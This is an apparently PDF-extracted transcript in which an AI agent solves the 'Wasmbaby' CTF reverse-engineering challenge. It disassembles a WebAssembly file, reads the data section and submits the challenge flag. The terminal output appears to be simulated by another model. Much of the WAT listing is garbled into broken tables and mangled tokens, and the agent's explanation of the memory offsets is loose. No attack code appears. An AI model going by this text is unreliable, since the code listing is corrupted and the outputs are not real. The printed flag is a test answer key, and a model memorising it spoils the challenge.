(Open file: n/a) (Current directory: /__home__LLM_CTF_Database__Wasmbaby) (Interactive session: n/a) bash-$

#### **Player Model**

**https://ctftime.org/writeup/29616**

- Let me analyze this challenge first: 1. It's a web challenge involving WebAssembly (Wasm) 2. We have an index.wasm file 3. There's a web server running on wasmbaby.chal.uiuc.tf:80 4. The name "Wasmbaby" suggests it might be a beginner-friendly _�→_ Wasm challenge

- Initial plans: 1. First, examine the index.wasm file to understand its structure _�→_ and content

- 2. Try to decompile/analyze the wasm file to understand its _�→_ functionality

- 3. Check if there are any web interactions needed 4. Look for potential hidden functions or flags in the wasm code Let me start by examining what files we have in the current _�→_ directory and checking their properties.

- ls -la **Terminal Model https://ctftime.org/writeup/29616** total 16 drwxr-xr-x 2 root root 4096 Jan 1 12:00 .


drwxr-xr-x 8 root root 4096 Jan 1 12:00 .. -rw-r--r-- 1 root root 3274 Jan 1 12:00 index.wasm

(Open file: n/a)

(Current directory: /__home__LLM_CTF_Database__Wasmbaby) (Interactive session: n/a) bash-$

#### **Player Model**

#### **https://ctftime.org/writeup/29616**

- I see we have an index.wasm file of size 3274 bytes. Since this is _�→_ a WebAssembly file, I should first check its content to _�→_ understand what we're dealing with. Let me use the file _�→_ command to confirm the file type.

file index.wasm

#### **Terminal Model**

#### **https://ctftime.org/writeup/29616**

- index.wasm: WebAssembly (wasm) binary module version 0x1 (MVP) (Open file: n/a)

(Current directory: /__home__LLM_CTF_Database__Wasmbaby) (Interactive session: n/a) bash-$

#### **Player Model https://ctftime.org/writeup/29616**

Indeed, it's a WebAssembly binary module. Since WebAssembly files _�→_ are binary format, I need to analyze it properly. There are

- _�→_ several tools that can help us decompile or disassemble

- _�→_ WebAssembly files. Given this is named "Wasmbaby", it's likely _�→_ a simpler challenge that might not require complex reverse _�→_ engineering.

- Let me first try to install ``` wabt ``` (WebAssembly Binary Toolkit) _�→_ which includes tools like wasm2wat to convert WebAssembly _�→_ binary format to text format.

apt-get install -y wabt

#### **Terminal Model**

**https://ctftime.org/writeup/29616**

Reading package lists... Done Building dependency tree... Done Reading state information... Done The following NEW packages will be installed: wabt

0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded. Need to get 1,246 kB of archives.

After this operation, 4,096 kB of additional disk space will be _�→_ used. Get:1 http://archive.ubuntu.com/ubuntu focal/universe amd64 wabt _�→_ amd64 1.0.13-1 [1,246 kB] Fetched 1,246 kB in 1s (1,246 kB/s) Selecting previously unselected package wabt.


(Reading database ... 74831 files and directories currently _�→_ installed.) Preparing to unpack .../wabt_1.0.13-1_amd64.deb ... Unpacking wabt (1.0.13-1) ... Setting up wabt (1.0.13-1) ... (Open file: n/a) (Current directory: /__home__LLM_CTF_Database__Wasmbaby) (Interactive session: n/a) bash-$

#### **Player Model**

**https://ctftime.org/writeup/29616**

Now that we have wabt installed, let's convert the WebAssembly _�→_ binary to its text representation (WAT format) so we can _�→_ analyze it better. I'll save the output to a file so we can _�→_ examine it properly.

wasm2wat index.wasm > index.wat

#### **Terminal Model**

**https://ctftime.org/writeup/29616**

(Open file: n/a)

(Current directory: /__home__LLM_CTF_Database__Wasmbaby) (Interactive session: n/a) bash-$

**Player Model https://ctftime.org/writeup/29616**

Let me examine the converted WAT file to understand the _�→_ WebAssembly code structure and functionality.

open index.wat

**Terminal Model https://ctftime.org/writeup/29616** [File: index.wat] 1:(module 2: (type (:
- 0
- ) (func (param i32) (result i32))) 3: (type (
- 1
- ) (func (param i32 i32) (result i32))) 4: (type (
- 2
- ) (func (result i32))) 5: (type (
- 3
- ) (func)) 6: (import "env" "memoryBase" (global (
- 0
- ) i32)) 7: (import "env" "memory" (memory (
- 0
- ) 256)) 8: (import "env" "table" (table (
- 0
- ) 0 funcref)) 9: (import "env" "tableBase" (global (
- 1
- ) i32)) 10: (func (
- 0
- ) (type 3) 11: i32.const 0 12: i32.const 1024 13: i32.store 14: i32.const 4 15: i32.const 1025 16: i32.store 17: i32.const 8 18: i32.const 1026 19: i32.store

#### **Terminal Model**


|20:<br>i<br>21<br>i|32.const 12<br>32t1027|
|---|---|
|:<br><br>22:<br>i|.cons <br>32.store|
|23:<br>i|32.const 16|
|24:<br>i|32.const 1028|
|25:<br>i|32.store|
|26:<br>i<br>27:<br>i|32.const 20<br>32.const1029|
|28:<br>i|32.store|
|29:<br>i|32.const 24|
|30:<br>i|32.const 1030|
|31:<br>i<br>32:<br>i|32.store<br>32.const 28|
|33:<br>i|32.const 1031|
|34:<br>i|32.store|
|35:<br>i|32.const 32|
|36:<br>i|32.const 1032|
|37:<br>i|32.store|
|38:<br>i|32.const 36|
|39:<br>i|32.const 1033|
|40:<br>i|32.store|
|41:<br>i|32.const 40|
|42:<br>i|32.const 1034|
|43:<br>i|32.store|
|44:<br>i|32.const 44|
|45:<br>i|32.const 1035|
|46:<br>i|32.store|
|47:<br>i|32.const 48|
|48:<br>i|32.const 1036|
|49:<br>i<br>50<br>i|32.store<br>252|
|:<br><br>51:<br>i|.const <br>32.const 1037|
|52:<br>i|32.store|
|53:<br>i<br>54:<br>i|32.const 56<br>32.const 1038|
|55<br>i|32t|
|:<br><br>56:<br>i|.sore<br>32.const 60|
|57:<br>i|32.const 1039|
|58:<br>i|32.store|
|59:<br>i|32.const 64|
|60:<br>i|32.const 1040|
|61:<br>i|32.store|
|62:<br>i|32.const 68|
|63:<br>i|32.const 1041|
|64:<br>i|32.store|
|65:<br>i|32.const 72|
|66:<br>i|32.const 1042|
|67:<br>i|32.store|
|68:<br>i|32.const 76|
|69:<br>i|32.const 1043|
|70:<br>i|32.store|
|71:<br>i|32.const 80|
|72:<br>i|32.const1044|
|73:<br>i|32.store|
|74:<br>i|32.const 84|
|75:<br>i|32.const 1045|
|76:<br>i|32.store|
|77:<br>i|32const88|
|78:<br>i|. <br>32.const 1046|
|79:<br>i|32.store|
|80:<br>i|32.const 92|
|81:<br>i<br>82:<br>i|32.const 1047<br>32.store|


83: i32.const 96 84: i32.const 1048 85: i32.store 86: i32.const 100 87: i32.const 1049 88: i32.store 89: i32.const 104 90: i32.const 1050 91: i32.store 92: i32.const 108 93: i32.const 1051 94: i32.store 95: i32.const 112 96: i32.const 1052 97: i32.store 98: i32.const 116 99: i32.const 1053 100: i32.store) (296 more lines) (Open file: index.wat) (Current directory: /__home__LLM_CTF_Database__Wasmbaby) (Interactive session: n/a) bash-$

**Player Model**

**https://ctftime.org/writeup/29616**

Looking at the WAT file, I can see it's storing a sequence of

- _�→_ values at specific memory locations. Each line follows a _�→_ pattern of storing values at incrementing memory addresses (0,

- _�→_ 4, 8, etc.) with corresponding values from memory locations

- _�→_ starting at 1024. This looks like it might be constructing _�→_ some data in memory.

Let me scroll down to see more of the file since there might be _�→_ important functions or data after this initialization part.

scroll_down

**Terminal Model https://ctftime.org/writeup/29616** [File: index.wat (continued from line 101)] 101: (func (:
- 1
- ) (type 0) (param i32) (result i32) 102: (local i32) 103: block
-
- label = @1 104: block
-
- label = @2 105: block
-
- label = @3 106: block
-
- label = @4 107: block
-
- label = @5 108: block
-
- label = @6 109: block
-
- label = @7 110: block
-
- label = @8 111: block
-
- label = @9 112: block
-
- label = @10 113: block
-
- label = @11 114: block
-
- label = @12 115: block
-
- label = @13 116: block
-
- label = @14 117: block
-
- label = @15 118: block
-
- label = @16


|119:<br>120:|block<br>;; label = @17<br>block<br>label=@18|
|---|---|
|121:|;;   <br>block<br>;; label = @19|
|122:|block<br>;; label = @20|
|123:|block<br>;; label =|
|@<br>_�→_|21|
|124:|block<br>;; label|
|= <br>_�→_|@22|
|125:<br>l<br>_�→_|block<br>;;<br>abel=@23|
|126:<br>l<br>_�_|block<br>;;<br>bel=@24|
|_→_<br>127:<br>l|block<br>;;<br>bl25|
|_�→_<br>128:|e = @<br>block|
|;<br>_�→_<br>129:|; label = @26<br>block|
|;<br>_�→_|; label = @27|
|130:||
|b<br>_�→_|lock<br>;; label = @28|
|131:||
|b<br>_�→_|lock<br>;; label = @29|
|132:||
|b<br>_�→_|lock<br>;; label = @30|
|133:||
|_�→_|block<br>;; label = @31|
|134:||
|_�→_|local.get 0|
|135:||
|_�→_|i32.const 31|
|136:||
|_�→_|i32.gt_u|
|137:||
|_�→_|brif 0 (;@31;)|
|138:|_|
|_�→_|localget0|
|139:|.|
|_�→_|i32.const 2|
|140:||
|_�→_|i32.shl|
|141:||
|_�→_|i32.load|
|142:||
|_�→_|local.tee 1|
|143:||
|_�→_|i32.const 1024|
|144:||
|_�→_|i32.sub|
|145:||
|_�→_|localet0|
|146:|.g <br>i32t31|
|_�→_|.cons|
|147:||
|_�→_|i32.eq|
|148:||
|_�→_|br_if 30 (;@1;)|
|149:||
|_�→_|drop|
|150:||
|_�→_|local.get 1|
|(196 <br>(Oen|more lines)<br>file:indexwat)|
|p <br>(Curr|.<br>ent directory: /__home__LLM_CTF_Database__Wasmbaby)|


(Interactive session: n/a) bash-$

#### **Player Model**

#### **https://ctftime.org/writeup/29616**

Interesting findings in the code:

1. The first function (func 0) seems to be initializing an array _�→_ or memory block with values starting from address 1024

2. The second function (func 1) appears to be some kind of _�→_ checking or validation function that: - Takes a parameter and checks if it's greater than 31 _�→_ (suggesting a 32-element array)

- Does memory loading and comparison with value 1024 - Has multiple nested blocks, suggesting complex control flow

Given that this is a WebAssembly challenge, and I see these memory _�→_ operations and comparisons, this might be checking for a _�→_ specific input sequence or password. Let me continue scrolling _�→_ down to see if there are more functions or data sections.

scroll_down

#### **Terminal Model**

**https://ctftime.org/writeup/29616**

|[File:|index.wat|(continued from line 151)]|
|---|---|---|
|151:|||
|_�→_|i32.const|1025|
|152:|||
|_�→_|i32.sub||
|153:|||
|_�→_|local.get|0|
|154:|||
|_�→_|i32.const|30|
|155:|||
|_�→_|i32.eq||
|156:|||
|_�→_|br_if 29|(;@2;)|
|157:|||
|_�→_|drop||
|158:|||
|_�→_|local.get|1|
|159:|||
|_�→_|i32.const|1026|
|160:|||
|_�→_|i32.sub||
|161:|||
|_�→_|local.get|0|
|162:|||
|_�→_|i32.const|29|
|163:|||
|_�→_|i32.eq||
|164:|||
|_�→_|br_if 28|(;@3;)|
|165:|||
|_�→_|drop||
|166:|||
|_�→_|local.get|1|
|167:|||
|_�→_|i32.const|1027|
|168:<br>_�_|i32sub|
|---|---|
|_→_<br>169:|.|
|_�→_|local.get 0|
|170:||
|_�→_|i32.const 28|
|171:||
|_�→_|i32.eq|
|172:||
|_�→_|br_if 27 (;@4;)|
|173:||
|_�→_<br>174:|drop|
|_�→_|local.get 1|
|175:||
|_�→_|i32.const 1028|
|176:||
|_�→_|i32sub|
|177:|.|
|_�→_|local.get 0|
|178:||
|_�→_|i32.const 27|
|179:||
|_�→_|i32.eq|
|180||
|:<br>_�→_|brif 26 (;@5;)|
|181:|_|
|_�→_|drop|
|182:||
|_�→_|local.get 1|
|183:||
|_�→_|i32.const 1029|
|184:||
|_�→_|i32.sub|
|185:||
|_�→_|local.get 0|
|186:||
|_�→_|i32const26|
|187:|.|
|_�→_|i32.eq|
|188:||
|_�→_|br_if 25 (;@6;)|
|189:||
|_�→_|drop|
|190:<br>_�→_|local.get 1|
|191:||
|_�→_|i32.const 1030|
|192:|i2|
|_�→_<br>193:|3.sub|
|_�→_|local.get 0|
|194:||
|_�→_|i32.const 25|
|195:||
|_�→_|i32.eq|
|196:||
|_�→_|br_if 24 (;@7;)|
|197:||
|_�→_|drop|
|198:||
|_�→_|local.get 1|


199:

_�→_ i32.const 1031 200:

- _�→_ i32.sub

(96 more lines)

(Open file: index.wat) (Current directory: /__home__LLM_CTF_Database__Wasmbaby) (Interactive session: n/a) bash-$

#### **Player Model**

#### **https://ctftime.org/writeup/29616**

I see a pattern forming here! This code is doing sequential checks _�→_ against values stored at increasing memory addresses (1024,

- _�→_ 1025, 1026, etc.) and comparing them with indices in

- _�→_ descending order (31, 30, 29, etc.). This strongly suggests _�→_ that there's an encoded string or flag stored in these memory _�→_ locations.

The structure shows:

1. Values are stored at memory locations starting from 1024

2. There's a checking function that verifies these values against _�→_ some input

3. The checking goes through 32 positions (0-31)

- Let me continue scrolling to see if we can find any data sections _�→_ or other functions that might reveal what these values _�→_ represent.

scroll_down

#### **Terminal Model**

#### **https://ctftime.org/writeup/29616**

[File: index.wat (continued from line 201)] 201:

_�→_ local.get 0 202: _�→_ i32.const 24 203: _�→_ i32.eq 204: _�→_ br_if 23 (;@8;) 205: _�→_ drop 206: _�→_ local.get 1 207: _�→_ i32.const 1032 208: _�→_ i32.sub 209: _�→_ local.get 0 210: _�→_ i32.const 23 211: _�→_ i32.eq 212: _�→_ br_if 22 (;@9;)


|213:<br>_�_|dro|
|---|---|
|_→_<br>214:|p|
|_�→_|local.get 1|
|215:||
|_�→_|i32.const 1033|
|216:||
|_�→_<br>217:|i32.sub|
|_�→_|local.get 0|
|218:||
|_�→_|i32.const 22|
|219:||
|_�→_|i32.eq|
|220:||
|_�→_|br_if 21 (;@10;)|
|221:<br>_�→_|drop|
|222:<br>_�→_|local.get 1|
|223:||
|_�→_|i32.const 1034|
|224:||
|_�→_|i32.sub|
|225:||
|_�→_|local.get 0|
|226:||
|_�→_|i32const21|
|227:|.|
|_�→_<br>228:|i32.eq|
|_�→_|br_if 20 (;@11;)|
|229:||
|_�→_|drop|
|230:||
|_�→_|local.get 1|
|231:<br>_�→_|i32.const 1035|
|232:||
|_�→_|i32.sub|
|233:||
|_�→_|local.get 0|
|234:||
|_�→_|i32.const 20|
|235:||
|_�→_|i32.eq|
|236:||
|_�→_|br_if 19 (;@12;)|
|237:||
|_�→_<br>238:|drop|
|_�→_|local.get 1|
|239:||
|_�→_|i32.const 1036|
|240:||
|_�→_|i32.sub|
|241:||
|_�_|localet0|
|_→_<br>242:|.g|
|_�→_|i32.const 19|
|243:||
|_�→_|i32.eq|


244: _�→_ br_if 18 (;@13;) 245: _�→_ drop 246: _�→_ local.get 1 247: _�→_ i32.const 1037 248: _�→_ i32.sub 249: _�→_ local.get 0 250: _�→_ i32.const 18 (46 more lines) (Open file: index.wat) (Current directory: /__home__LLM_CTF_Database__Wasmbaby) (Interactive session: n/a) bash-$

#### **Player Model**

#### **https://ctftime.org/writeup/29616**

- The pattern continues, and now I'm certain this is checking some _�→_ kind of array or string. Looking at the memory operations:

1. Values are loaded from memory locations 1024-1055 (32 values _�→_ total)

2. Each value is compared with the index in a reverse order (31 _�→_ down to 0)

3. This suggests the flag might be stored in these memory locations

Let me try to get to the end of the file to see if there are any _�→_ data sections that might contain the actual values being _�→_ stored.

scroll_down

**Terminal Model https://ctftime.org/writeup/29616**

[File: index.wat (continued from line 251)] 251: _�→_ i32.eq 252: _�→_ br_if 17 (;@14;) 253: _�→_ drop 254: _�→_ local.get 1 255: _�→_ i32.const 1038 256: _�→_ i32.sub 257: _�→_ local.get 0 258: _�→_ i32.const 17 259: _�→_ i32.eq


|260:|bif16@15|
|---|---|
|_�→_<br>261:|r_  (;;)|
|_�→_<br>262:|drop|
|_�→_|local.get 1|
|263:||
|_�→_|i32.const 1039|
|264:||
|_�→_|i32.sub|
|265:||
|_�→_<br>266:|local.get 0|
|_�→_|i32.const 16|
|267:||
|_�→_|i32.eq|
|268:||
|_�→_|br_if 15 (;@16;)|
|269:||
|_�→_|drop|
|270:||
|_�→_<br>271:|local.get 1|
|_�→_|i32.const 1040|
|272:||
|_�→_|i32.sub|
|273:||
|_�→_|local.get 0|
|274:||
|_�→_|i32.const 15|
|275:||
|_�→_|i32.eq|
|276||
|:<br>_�→_|brif 14 (;@17;)|
|277:|_|
|_�→_|dro|
|278:|p|
|_�→_|local.get 1|
|279:||
|_�→_|i32.const 1041|
|280:||
|_�→_|i32.sub|
|281:||
|_�→_|local.get0|
|282:||
|_�→_|i32.const 14|
|283:||
|_�→_|i32.eq|
|284:||
|_�→_|br_if 13 (;@18;)|
|285:||
|_�→_|drop|
|286:||
|_�→_|localget1|
|287:|.|
|_�→_|i32.const 1042|
|288:||
|_�→_|i32.sub|
|289:||
|_�→_|local.get 0|
|290:<br>_�→_|i32.const 13|


291: _�→_ i32.eq 292: _�→_ br_if 12 (;@19;) 293: _�→_ drop 294: _�→_ local.get 1 295: _�→_ i32.const 1043 296: _�→_ i32.sub 297: _�→_ local.get 0 298: _�→_ i32.const 12 299: _�→_ i32.eq 300: _�→_ br_if 11 (;@20;) (96 more lines) (Open file: index.wat)

(Current directory: /__home__LLM_CTF_Database__Wasmbaby) (Interactive session: n/a) bash-$

#### **Player Model**

#### **https://ctftime.org/writeup/29616**

The pattern continues and I need to find the data section or any _�→_ hints about what values are being stored. Let me continue _�→_ scrolling to reach the end of the file.

scroll_down

#### **Terminal Model**

**https://ctftime.org/writeup/29616**

[File: index.wat (continued from line 301)] 301:

_�→_ drop 302: _�→_ local.get 1 303: _�→_ i32.const 1044 304: _�→_ i32.sub 305: _�→_ local.get 0 306: _�→_ i32.const 11 307: _�→_ i32.eq 308: _�→_ br_if 10 (;@21;) 309: _�→_ drop 310: _�→_ local.get 1 311: _�→_ i32.const 1045


|312:<br>_�_|i32sub|
|---|---|
|_→_<br>313:|.|
|_�→_|local.get 0|
|314:||
|_�→_|i32.const 10|
|315:<br>_�→_|i32.eq|
|316:||
|_�→_|br_if 9 (;@22;)|
|317:||
|_�→_<br>318:|drop|
|_�→_|local.get 1|
|319:||
|_�→_|i32.const 1046|
|320:||
|_�→_|i32sub|
|321:|.|
|_�→_|local.get 0|
|322:||
|_�→_|i32.const 9|
|323:||
|_�→_|i32.eq|
|324||
|:<br>_�→_|brif 8 (;@23;)|
|325:|_|
|_�→_|drop|
|326:||
|_�→_|local.get 1|
|327:||
|_�→_|i32.const 1047|
|328:||
|_�→_|i32.sub|
|329||
|:<br>_�→_|local.get 0|
|330:||
|_�→_|i32const8|
|331:|.|
|_�→_|i32.eq|
|332:||
|_�→_|br_if 7 (;@24;)|
|333:||
|_�→_|drop|
|334:<br>_�→_|local.get 1|
|335:||
|_�→_|i32const1048|
|336:|.|
||i2|
|_�→_<br>337:|3.sub|
|_�→_|local.get 0|
|338:||
|_�→_|i32.const 7|
|339:||
|_�→_|i32.eq|
|340:||
|_�→_|br_if 6 (;@25;)|
|341:||
|_�→_|drop|
|342:||
|_�→_|local.get 1|


343: _�→_ i32.const 1049 344: _�→_ i32.sub 345: _�→_ local.get 0 346: _�→_ i32.const 6 347: _�→_ i32.eq 348: _�→_ br_if 5 (;@26;) 349: _�→_ drop 350: _�→_ local.get 1 (46 more lines) (Open file: index.wat) (Current directory: /__home__LLM_CTF_Database__Wasmbaby) (Interactive session: n/a) bash-$

#### **Player Model**

#### **https://ctftime.org/writeup/29616**

Let me continue scrolling to find any data sections or the end of _�→_ the file. We're getting close to the end of this checking _�→_ function and there might be important information after it.

scroll_down

#### **Terminal Model**

**https://ctftime.org/writeup/29616**

[File: index.wat (continued from line 351)] 351:

_�→_ i32.const 1050 352: _�→_ i32.sub 353: _�→_ local.get 0 354: _�→_ i32.const 5 355: _�→_ i32.eq 356: _�→_ br_if 4 (;@27;) 357: _�→_ drop 358: _�→_ local.get 1 359: _�→_ i32.const 1051 360: _�→_ i32.sub 361: _�→_ local.get 0 362: _�→_ i32.const 4 363: _�→_ i32.eq


|364:<br>_�→_|br_if 3 (;@28;)|
|---|---|
|365:||
|_�→_<br>366:|drop|
|_�→_|local.get 1|
|367:||
|_�→_|i32.const 1052|
|368:||
|_�→_|i32.sub|
|369:||
|_�→_|local.get 0|
|370:||
|_�→_|i32.const 3|
|371:||
|_�→_|i32.eq|
|372:||
|_�→_|br_if 2 (;@29;)|
|373:||
|_�→_<br>374:|drop|
|_�→_|local.get 1|
|375:||
|_�→_|i32.const 1053|
|376:||
|_�→_|i32.sub|
|377:||
|_�→_|local.get 0|
|378:||
|_�→_|i32.const 2|
|379:||
|_�→_|i32.eq|
|380||
|:<br>_�→_|br_if 1 (;@30;)|
|381:||
|_�→_|drop|
|382:<br>_�→_|local.get 1|
|383:||
|_�→_|i32.const 1054|
|384:||
|_�→_|i32.sub|
|385:||
|_�→_|local.get 0|
|386:||
|_�→_|i32.const 1|
|387:||
|_�→_|i32.eq|
|388:||
|_�→_|br_if 0 (;@31;)|
|389:||
|_�→_|drop|
|390:||
|_�→_|localget1|
|391:|.|
|_�→_|i32.const 1055|
|392:||
|_�→_<br>393:|i32.sub|
|_�→_|return|
|394:<br>e<br>_�→_|nd|


395: _�→_ i32.const 0 396: _�→_ return 397: _�→_ end 398: _�→_ i32.const 0 399: _�→_ return 400: end (96 more lines) (Open file: index.wat) (Current directory: /__home__LLM_CTF_Database__Wasmbaby) (Interactive session: n/a) bash-$

#### **Player Model**

#### **https://ctftime.org/writeup/29616**

- After analyzing the code further, I can see this is a validation _�→_ function that checks input values against a sequence of _�→_ expected values. The pattern is:

1. Values are stored in memory from address 1024 to 1055 (32 _�→_ values)

2. There's a function that compares these values in reverse order _�→_ (31 to 0)

3. If any comparison fails, it returns 0 (indicating failure)

Since we have a WebAssembly file and it's checking specific _�→_ values, we can try to extract the values that are being stored _�→_ in memory. The best way would be to use wasm-objdump to see _�→_ the data section.

wasm-objdump -s index.wasm

#### **Terminal Model**

**https://ctftime.org/writeup/29616**

index.wasm: file format wasm 0x1

Contents of section Data: 0420: 7569 7563 7466 7b77 656c 636f 6d65 5f74 _�→_ uiuctf{welcome_t 0430: 6f5f 7761 736d 5f65 3363 3362 6464 317d _�→_ o_wasm_e3c3bdd1} (Open file: index.wat) (Current directory: /__home__LLM_CTF_Database__Wasmbaby) (Interactive session: n/a) bash-$

**Player Model https://ctftime.org/writeup/29616**

Aha! I found the flag directly in the data section of the _�→_ WebAssembly binary! This makes perfect sense because:

1. The code we saw was loading values from memory starting at _�→_ offset 1024 (0x400 in hex)


2. The data section shows content starting at 0x420 which contains _�→_ the flag

3. The values being compared were actually ASCII characters of the _�→_ flag string

The flag appears to be in plain text in the data section. Let me _�→_ submit the flag I found.

submit 'uiuctf{welcome_to_wasm_e3c3bdd1}'
